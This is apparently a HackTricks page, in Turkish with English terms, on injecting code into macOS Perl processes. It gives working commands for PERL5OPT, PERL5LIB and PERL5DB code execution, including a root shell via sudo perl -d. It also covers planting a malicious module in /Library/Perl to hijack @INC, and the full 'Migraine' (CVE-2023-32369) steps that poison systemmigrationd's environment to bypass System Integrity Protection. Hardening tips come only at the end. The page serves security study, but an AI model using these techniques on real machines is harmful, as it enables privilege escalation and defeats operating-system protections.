# macOS Perl Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## `PERL5OPT` ve `PERL5LIB` env variable'ları aracılığıyla

**`PERL5OPT`** env variable'ını kullanarak, interpreter başlatıldığında **Perl**'ün arbitrary commands çalıştırması sağlanabilir (hatta target script'in ilk satırı parse edilmeden **önce** bile).

Örneğin, şu script'i oluşturun:
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
Şimdi **env değişkenini export edin** ve **perl** script'ini çalıştırın:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Başka bir seçenek de bir Perl modülü oluşturmaktır (ör. `/tmp/pmod.pm`):
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
Ardından, modülün otomatik olarak bulunup yüklenmesi için env değişkenlerini kullanın:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod perl victim.pl
```
### Diğer ilgi çekici environment variables

- **`PERL5DB`** – interpreter **`-d`** (debugger) flag'iyle başlatıldığında, `PERL5DB` içeriği debugger context *içinde* Perl code olarak çalıştırılır.
Hem environment'ı hem de privileged Perl process'in command-line flag'lerini etkileyebiliyorsanız şuna benzer bir şey yapabilirsiniz:

```bash
export PERL5DB='system("/bin/zsh")'
sudo perl -d /usr/bin/some_admin_script.pl   # will drop a shell before executing the script
```

- **`PERL5SHELL`** – Windows'ta bu variable, Perl'in shell spawn etmesi gerektiğinde hangi shell executable'ını kullanacağını kontrol eder. macOS ile ilgili olmadığı için burada yalnızca bütünlük amacıyla belirtilmiştir.

`PERL5DB` **`-d`** switch'ini gerektirse de troubleshooting amacıyla bu flag etkinleştirilerek *root* olarak çalıştırılan maintenance veya installer script'lerine sıkça rastlanır. Bu da variable'ı geçerli bir escalation vector'ü haline getirir.

## Dependencies üzerinden (@INC abuse)

Perl'in arayacağı include path'i (**`@INC`**) şu şekilde listelemek mümkündür:
```bash
perl -e 'print join("\n", @INC)'
```
macOS 13/14'te tipik çıktı şu şekilde görünür:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Döndürülen klasörlerin bazıları hiç mevcut değil, ancak **`/Library/Perl/5.30`** mevcut, SIP tarafından *korunmuyor* ve SIP tarafından korunan klasörlerden *önce* geliyor. Bu nedenle, *root* olarak yazabiliyorsanız, herhangi bir privileged script bu modülü import ettiğinde *öncelikli olarak* yüklenecek kötü amaçlı bir modül (ör. `File/Basename.pm`) bırakabilirsiniz.

> [!WARNING]
> **`/Library/Perl`** içine yazmak için hâlâ **root** yetkisine ihtiyacınız vardır ve macOS, yazma işlemini gerçekleştiren process için *Full Disk Access* isteyen bir **TCC** prompt'u gösterir.

Örneğin, bir script **`use File::Basename;`** import ediyorsa, saldırgan tarafından kontrol edilen kodu içeren `/Library/Perl/5.30/File/Basename.pm` dosyasını oluşturmak mümkün olur.

## Migration Assistant üzerinden SIP bypass (CVE-2023-32369 “Migraine”)

Mayıs 2023'te Microsoft, **CVE-2023-32369**'u, diğer adıyla **Migraine**'ı açıkladı. Bu, *root* saldırganın System Integrity Protection'ı (SIP) tamamen **bypass etmesini** sağlayan bir post-exploitation tekniğidir.
Güvenlik açığı bulunan component, **`com.apple.rootless.install.heritable`** entitlement'ına sahip **`systemmigrationd`** daemon'ıdır. Bu daemon tarafından spawn edilen herhangi bir child process, entitlement'ı miras alır ve bu nedenle SIP kısıtlamalarının **dışında** çalışır.<sup>[[1]](#references)</sup>

Araştırmacıların tespit ettiği child process'ler arasında Apple tarafından imzalanmış interpreter da bulunur:<sup>[[1]](#references)</sup>
```
/usr/bin/perl /usr/libexec/migrateLocalKDC …
```
Perl `PERL5OPT`'ı (ve Bash `BASH_ENV`'i) dikkate aldığından, daemon'un *ortamını* zehirlemek SIP olmayan bir bağlamda keyfi kod çalıştırmak için yeterlidir:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# As root
launchctl setenv PERL5OPT '-Mwarnings;system("/private/tmp/migraine.sh")'

# Trigger a migration (or just wait – systemmigrationd will eventually spawn perl)
open -a "Migration Assistant.app"   # or programmatically invoke /System/Library/PrivateFrameworks/SystemMigration.framework/Resources/MigrationUtility
```
`migrateLocalKDC` çalıştığında, `/usr/bin/perl` kötü amaçlı `PERL5OPT` ile başlar ve SIP yeniden etkinleştirilmeden *önce* `/private/tmp/migraine.sh` dosyasını çalıştırır. Bu script üzerinden, örneğin bir payload'u **`/System/Library/LaunchDaemons`** içine kopyalayabilir veya bir dosyayı **silinemez** hale getirmek için `com.apple.rootless` extended attribute'ünü atayabilirsiniz.

Apple bu sorunu macOS **Ventura 13.4**, **Monterey 12.6.6** ve **Big Sur 11.7.7** sürümlerinde düzeltti; ancak eski veya patch uygulanmamış sistemler hâlâ exploitable durumdadır.<sup>[[1]](#references)</sup>

## Hardening önerileri

1. **Tehlikeli değişkenleri temizleyin** – privileged launchdaemon'lar veya cron job'ları temiz bir environment ile başlatılmalıdır (`launchctl unsetenv PERL5OPT`, `env -i` vb.).
2. **Interpreter'ları root olarak çalıştırmaktan kaçının**; yalnızca kesinlikle gerekli olduğunda kullanın. Derlenmiş binary'ler kullanın veya erken aşamada privilege'ları düşürün.
3. **Vendor script'lerini `-T` (taint mode) ile çalıştırın**; böylece taint checking etkinleştirildiğinde Perl, `PERL5OPT` ve diğer güvenli olmayan switch'leri yok sayar.
4. **macOS'u güncel tutun** – “Migraine” güncel release'lerde tamamen patch'lenmiştir.

## References

- [1] [Microsoft Security Blog – Yeni macOS vulnerability'si, Migraine, System Integrity Protection'ı bypass edebilir (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [2] [Hackyboiz – macOS: Part1 - SIP Bypass](https://hackyboiz.github.io/2025/05/11/clalxk/MacOS_SIP-Bypass_en/)

{{#include ../../../banners/hacktricks-training.md}}
